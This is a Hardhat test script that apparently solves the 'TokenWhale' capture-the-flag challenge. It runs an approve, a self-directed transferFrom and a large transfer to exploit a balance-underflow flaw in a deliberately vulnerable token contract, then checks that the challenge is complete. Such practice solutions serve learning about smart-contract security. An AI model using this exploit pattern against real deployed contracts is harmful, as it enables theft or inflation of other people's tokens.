const { expect } = require("chai");
const { ethers } = require("hardhat");

const CHALLENGE_ADDRESS = "0xa07ffD7F4285B8af8c6317239310A038360543D5";

before(async () => {
  accounts = await ethers.getSigners();
  player = accounts[0];
  eoa2 = accounts[1];
});

it("TokenWhale", async function () {
  const chFactory = await ethers.getContractFactory("TokenWhaleChallenge");
  contract = await chFactory.attach(CHALLENGE_ADDRESS);
  tx = await contract
    .connect(player)
    .approve(eoa2.address, 1, { gasLimit: 3e6 });
  console.log("approve tx intitiated");
  await tx.wait();
  console.log("approve tx completed");

  tx = await contract
    .connect(eoa2)
    .transferFrom(player.address, player.address, 1, { gasLimit: 3e6 });
  console.log("transferFrom tx intitiated");
  await tx.wait();
  console.log("transferFrom tx completed");

  tx = await contract
    .connect(eoa2)
    .transfer(player.address, 1000000, { gasLimit: 3e6 });
  console.log("transfer tx intitiated");
  await tx.wait();
  console.log("transfer tx completed");
  var isComplete = await contract.connect(player).isComplete();
  expect(isComplete).to.be.true;
});
